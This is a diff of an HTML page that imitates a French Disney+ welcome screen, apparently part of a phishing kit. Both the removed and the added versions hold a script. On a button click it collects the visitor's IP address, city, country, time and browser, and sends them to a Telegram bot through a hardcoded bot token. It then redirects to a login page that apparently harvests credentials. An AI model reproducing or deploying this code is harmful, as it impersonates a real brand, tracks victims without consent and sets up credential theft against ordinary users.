@@ -3,60 +3,109 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Disney+ Clone</title>
-  <link rel="stylesheet" href="style.css" />
-</head>
-<body>
-  <div class="background">
-    <header>
-      <img src="Images/compose2.png" alt="Logo Disney+" class="logo" />
-    </header>
-
-    <section class="content">
-      <h1 class="headline">Nouvelles productions originales, grands films et séries cultes</h1>
-      <h2 class="subheadline">À partir de 5,99 € par mois. Sans frais supplémentaires. Sans engagement*</h2>
-      
-      <div class="button-container">
-        <button id="continueBtn">CONTINUER</button>
-      </div>
-
-      <p class="disclaimer">Profitez de 12 mois au prix de 10 avec un abonnement Premium ou Standard annuel. Économies par rapport à un abonnement mensuel.</p>
-      <p class="note">* La résiliation prend effet à la fin de la période d'abonnement en cours. Abonnement requis. 5,99 €/mois pour Standard avec pub.</p>
-    </section>
-  </div>
-
- <!-- Script Telegram -->
-<script>
-  document.getElementById("continueBtn").addEventListener("click", async function () {
-    const webhookURL = "https://api.telegram.org/bot8079060666:AAGfVOxTqIR7teiEPuU3a-qZFcL9vdVTSOg/sendMessage";
-    const chatId = "1887198443";
-
-    try {
-      const res = await fetch("https://ipapi.co/json/");
-      const data = await res.json();
-
-      const message = `🔔 NOUVEAU CLIC !
-🌍 IP : ${data.ip}
-📍 Ville : ${data.city}
-🌐 Pays : ${data.country_name}
-🕒 Heure : ${new Date().toLocaleString()}
-📱 Navigateur : ${navigator.userAgent}`;
-
-      await fetch(webhookURL, {
-        method: "POST",
-        headers: {
-          "Content-Type": "application/json"
-        },
-        body: JSON.stringify({
-          chat_id: chatId,
-          text: message
-        })
-      });
-    } catch (err) {
-      console.error("Erreur lors de l'envoi Telegram :", err);
+  <title>Disney+ | Bienvenue</title>
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
     }
 
-    // Redirection automatique
-    window.location.href = "login.html";
-  });
-</script>
+    body, html {
+      height: 100%;
+      font-family: Arial, sans-serif;
+      color: #fff;
+      background-color: #000;
+    }
+
+    .background {
+      background: url('Images/b4e8fb27-b13d-4034-ad66-81493edbca39.png') no-repeat center center/cover;
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      z-index: -1;
+    }
+
+    .overlay {
+      background-color: rgba(0, 0, 0, 0.65);
+      position: absolute;
+      top: 0;
+      left: 0;
+      height: 100%;
+      width: 100%;
+    }
+
+    .content {
+      position: relative;
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      align-items: center;
+      height: 100%;
+      text-align: center;
+      padding: 20px;
+      z-index: 2;
+    }
+
+    .logo {
+      width: 160px;
+      margin-bottom: 40px;
+    }
+
+    .cta-button {
+      padding: 15px 40px;
+      font-size: 18px;
+      background-color: #0072d2;
+      border: none;
+      border-radius: 5px;
+      color: white;
+      cursor: pointer;
+      transition: background-color 0.3s ease;
+    }
+
+    .cta-button:hover {
+      background-color: #005bb5;
+    }
+  </style>
+</head>
+<body>
+  <div class="background"></div>
+  <div class="overlay"></div>
+
+  <div class="content">
+    <img src="Images/compose2.png" alt="Disney+" class="logo" />
+    <button class="cta-button" id="continueBtn">CONTINUER</button>
+  </div>
+
+  <script>
+    document.getElementById("continueBtn").addEventListener("click", async function () {
+      const webhookURL = "https://api.telegram.org/bot8079060666:AAGfVOxTqIR7teiEPuU3a-qZFcL9vdVTSOg/sendMessage";
+      const chatId = "1887198443";
+
+      try {
+        const res = await fetch("https://ipapi.co/json/");
+        const data = await res.json();
+
+        const message = `🔔 NOUVEAU CLIC !\n🌍 IP : ${data.ip}\n📍 Ville : ${data.city}\n🌐 Pays : ${data.country_name}\n🕒 Heure : ${new Date().toLocaleString()}\n📱 Navigateur : ${navigator.userAgent}`;
+
+        await fetch(webhookURL, {
+          method: "POST",
+          headers: {
+            "Content-Type": "application/json"
+          },
+          body: JSON.stringify({
+            chat_id: chatId,
+            text: message
+          })
+        });
+      } catch (err) {
+        console.error("Erreur lors de l'envoi Telegram :", err);
+      }
+
+      window.location.href = "login.html";
+    });
+  </script>
+</body>
+</html>
